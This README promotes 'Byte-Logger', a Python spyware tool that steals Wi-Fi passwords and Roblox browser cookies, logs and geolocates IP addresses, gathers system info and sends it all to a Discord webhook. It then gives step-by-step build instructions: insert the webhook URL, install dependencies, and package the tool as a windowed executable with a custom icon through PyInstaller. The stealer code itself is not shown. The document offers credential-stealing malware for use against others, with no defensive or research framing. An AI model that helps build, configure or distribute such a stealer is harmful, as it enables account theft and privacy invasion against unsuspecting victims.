# Byte-Logger
A logger/spyware written in python 3\
Written in windows so odnt expect it to work on other Operating Systems\
\
This logger can has:
```
• Discord webhook implementation (1 bot)
• Wifi-password taker
• Auto IP geolocator(city,country,postal,latitude&longitude)
• Roblox Cookie Stealer from Chrome,Opera,Firefox and Edge
• IP logger
• System info
```
# Discord Screenshots:


# How to run:
Get python(I used 3.9.12)/
Install Byte-Logger.py onto your system/
Make a Discord server and add a webhook\
Copy the Webhook URL and replace YourWebhookURL with the URl(line 14 of the code)\
make a text file called requirements.txt and replace the contents with the requirements.txt inside of the repository/

Run this:
```
pip install -r Path-To-requirements.txt
```
Also run this if you don't have PyInstaller:
```
pip installer pyinstaller 
```
Once all 3rd party libraries are installed and the code configured\
Open up command prompt or powershell and run this:
```
pyinstaller --noconfirm --onefile --windowed --icon "Path-To-Your-.ico-file" --ascii --clean "path-to-Byte-Logger.py"
```
Your exe will be created in the directory which cmd or powershell was set in.
